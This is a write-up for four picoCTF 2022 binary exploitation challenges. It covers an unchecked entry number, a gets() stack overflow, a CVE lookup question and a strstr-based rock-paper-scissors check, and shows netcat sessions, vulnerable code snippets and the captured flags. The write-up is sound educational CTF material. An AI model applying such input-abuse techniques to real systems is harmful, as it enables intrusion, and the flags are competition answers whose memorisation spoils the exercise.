---
title: "picoCTF 2022 - Binary Exploitation"
excerpt: "Writeup for the picoCTF 2022 - Binary Exploitation category"
last_modified_at: 2022-04-04
stickies: true
stickies_path: "/assets/stickies/picoctf.png"
toc: true
toc_label: "Challenges"
toc_sticky: true
categories:
  - Writeups
tags:
  - picoCTF
---

## Binary Exploitation
### basic-file-exploit
`100 points` `5148 solves`

> The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!<br>
> Connect to the program with netcat:<br>
> `$ nc saturn.picoctf.net 54047`<br>
> The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/537/program-redacted.c).

The program first shows the menu for its function, to create or read entries in the database.

```text
1: create entry in database
2: read entry in database according to entry number
3: exit program
```

Scrolling through the source code reveals that the entry number `0` should give the flag.

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```

Since at least one entry must exist before it is allowed to input an entry number to read, a dummy entry was created first then the entry number `0` was inputted to the program, the flag is then returned.

```bash
└─$ nc saturn.picoctf.net 54047
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
test
test
Please enter the length of your data:
4
4
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}`

<br>

### buffer overflow 0
`100 points` `4424 solves`

> `gets`<br>
> Smash the stack<br>
> Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using:<br>
> `nc saturn.picoctf.net 51091`

```bash
└─$ nc saturn.picoctf.net 51091
Input: AAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}`

<br>

### CVE-XXXX-XXXX
`100 points` `5009 solves`

> Enter the CVE of the vulnerability as the flag with the correct flag format: `picoCTF{CVE-XXXX-XXXXX}` replacing XXXX-XXXXX with the numbers for the matching vulnerability.<br>
> The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

Google searched with the keyword “Windows Print Spooler Service RCE” and the CVE number was returned.

Flag: `picoCTF{CVE-2021-34527}`

<br>

### RPS
`200 points` `2607 solves`

> Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.<br>
> Connect to the program with netcat:<br>
> `$ nc saturn.picoctf.net 56981`<br>
> The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/444/game-redacted.c).

The source code revealed that the checking mechanism of whether the player won is by `strstr(<PLAYER_INPUT>, <OPTION_THAT_BEATS_COMPUTER>)`. In other words, the program checks whether the option that can be the computer exists in the string inputted by the user.

```c
char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
...
int computer_turn = rand() % 3;
printf("You played: %s\n", player_turn);
printf("The computer played: %s\n", hands[computer_turn]);

if (strstr(player_turn, loses[computer_turn])) {
  puts("You win! Play again?");
  return true;
} else {
  puts("Seems like you didn't win this time. Play again?");
  return false;
}
```

To exploit the mechanism, the user input `rockpaperscissors` was used for 5 times and it won all the games as it contained all of the available options, that when the program searches for the option string that can beat the computer, it definitely exists in the user input. The flag was hence returned.

```bash
Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}
```

Flag: `picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}`

<br>
